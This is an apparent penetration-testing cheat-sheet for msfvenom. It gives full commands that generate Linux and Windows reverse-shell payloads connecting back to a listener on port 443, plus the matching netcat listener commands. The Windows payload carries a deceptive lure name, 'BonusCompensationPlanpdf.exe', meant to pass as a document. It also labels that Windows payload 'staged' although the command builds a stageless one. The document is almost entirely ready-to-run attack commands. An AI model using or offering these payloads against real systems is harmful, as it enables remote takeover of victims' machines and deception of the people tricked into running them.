## msfvenom

Payload generator for Metasploit Framework. to list all available payloads, you can use the following command:

```shell
msfvenom -l payloads
```

## Creating a Stageless Payload (Linux)

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

### Listening for the connection

```shell
sudo nc -lvnp 443
```

when target machine executes the payload, you will get a reverse shell connection.

## Creating a Staged Payload (Windows)

```shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

### Listening for the connection

```shell
sudo nc -lvnp 443
```

when target machine executes the payload, you will get a reverse shell connection.
